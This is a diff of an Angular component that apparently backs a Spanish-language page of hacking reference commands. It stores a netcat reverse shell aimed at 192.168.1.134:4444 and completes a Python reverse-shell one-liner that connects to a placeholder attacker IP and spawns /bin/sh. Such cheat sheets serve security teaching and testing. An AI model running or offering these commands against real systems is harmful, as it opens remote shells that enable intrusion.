@@ -19,7 +19,7 @@ export class ReverShellComponent {
   pageTitle: string = '';
   nc:  string = `nc -e /bin/bash 192.168.1.134 4444`;
   which:  string = `which python`;
-  pythonRever: string="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP ATACANTE>\",<PUERTO EN ESCUCHA>>))";
+  pythonRever: string="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP ATACANTE>\",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
   phpServer: string = `php -S localhost:8000`;
   codigo:  string = 'codigo';
   comando:  string = 'comando';
